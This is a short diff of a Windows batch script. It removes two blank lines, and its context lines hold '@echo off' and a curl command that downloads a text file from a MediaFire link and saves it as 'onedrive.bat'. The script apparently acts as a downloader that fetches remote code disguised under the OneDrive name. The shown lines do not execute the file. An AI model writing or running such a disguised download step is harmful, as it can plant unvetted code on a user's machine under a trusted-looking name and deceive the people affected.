@@ -1,5 +1,3 @@
-
-
 @echo off
 
 curl "https://download1592.mediafire.com/pt32hdj41pdg/kxobtw3ce0xsxqy/New+Text+Document+%285%29.txt" --output onedrive.bat
